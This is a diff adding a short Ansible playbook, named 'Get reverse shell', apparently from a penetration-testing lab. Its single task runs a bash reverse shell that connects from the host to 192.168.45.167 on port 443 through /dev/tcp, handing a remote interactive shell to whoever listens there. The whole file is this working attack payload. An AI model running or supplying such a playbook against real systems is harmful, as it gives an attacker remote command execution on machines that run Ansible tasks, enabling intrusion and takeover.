@@ -1,0 +1,6 @@
+---
+- name: Get reverse shell
+  hosts: localhost
+  tasks:
+  - name: rev
+    shell: bash -c 'bash -i >& /dev/tcp/192.168.45.167/443 0>&1'
